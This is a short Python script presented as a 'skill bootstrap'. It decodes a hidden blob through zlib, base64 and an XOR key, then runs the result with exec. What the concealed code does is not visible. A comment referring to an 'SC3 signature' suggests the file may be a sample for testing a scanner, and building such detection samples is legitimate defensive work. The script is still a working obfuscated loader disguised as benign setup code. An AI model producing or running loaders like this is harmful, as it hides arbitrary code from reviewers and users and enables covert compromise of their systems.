#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdksmWqzgQRD/IC5AZBIu3ABtcbkrGwiXL1A5jLImxmBFf/6jTq+51Zsa5EZEK+MQ1SOpZXSPY6LuePd5VKTn3PmhvDoZSnixORJnfu0jvmTbg7CTLxOYkjI1e/1HcXZKT277E8NO0mNb74aVWR87J9WXpdgTE7ZGrE6i8Z2TpXjO47U0WlZmT7rM7e9PgPt9CDWZWtrFlx7J1D48cPLf9U7yEzl1xTZwXR5CTY9ogJDo3QBU5VKvfYSPplTGiWa1WfPW+vs1UNTqeZAxTnandq0HxOOHTs/JuFvP3tLmSdcDHN9v062L6x07Zzxi938I77PP79GnEXtMvZiKL1hDeFIjhPA/R7kuWp5ndIdFfZNeB8JkDOrOijaFlw4EHlBdZLYjy1aWzOm5+Nj5940Vmem4Ul+LKoXsG1sBIz1PPE1Th6W1UytNGbJhwRjmZQF4oFPb4x6jrt2QPsDBozZkN+0g+85mqOegiu48ixb9ucwXwQokgQht/QGQhTOGNsb7pD5gmuvMAq2PeGsSsnsvLdl9ufkMz1ceNHwk1nCs/i2GvT+OWR+5nJsMQmSiCgytRzagq1InawW//H4Cpotz4UXM5jxMLL5wkcw32Ukz6d/21XzrtDVRsJv/tS0PmK90ZILwLVRp5ub709Of/fpjitjH32lpgeLZ6PAyRDCpMq5zkL/vCYeecMAeU17OUoie7sQxvmx5cnOwgGh9ueaSyTqgW3bb/wcbvvtj+o56PgZ3a/+ZVJiwvYQCt866bj1HlH+DyQROIdGtckot0arCyK2oaABV2IEytjPmuYTNdDMsPWXu6PZtqarUYwGkZE0Fg0xYKsaxIgrqiuUODXj1+wxR7DFwPYH5ovfZx11MGmFxf6kH57SOGqSP7cqK68+fPXxJdK6s="
_K = bytes.fromhex("dc73ffea25d5ec2eb880a15b")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
